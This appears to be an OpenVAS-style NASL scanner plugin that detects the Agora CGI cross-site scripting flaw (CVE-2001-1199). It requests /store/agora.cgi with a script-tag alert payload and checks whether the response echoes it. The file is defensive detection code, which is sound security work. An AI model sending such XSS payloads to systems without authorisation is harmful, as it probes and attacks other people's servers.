if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10836" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3702 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2001-1199" );
	script_name( "Agora CGI Cross Site Scripting" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2002 Matt Moore" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "cross_site_scripting.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade to Agora 4.0e or newer." );
	script_tag( name: "summary", value: "The remote web server contains a CGI which is vulnerable to a cross-site
  scripting issue.

  Description :

  Agora is a CGI based e-commerce package. Due to poor input validation,
  Agora allows an attacker to execute cross-site scripting attacks." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod", value: "50" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
host = http_host_name( dont_add_port: TRUE );
if(http_get_has_generic_xss( port: port, host: host )){
	exit( 0 );
}
url = "/store/agora.cgi?cart_id=<SCRIPT>alert(document.domain)</SCRIPT>&xm=on&product=HTML";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(isnull( res )){
	exit( 0 );
}
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<SCRIPT>alert(document.domain)</SCRIPT>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

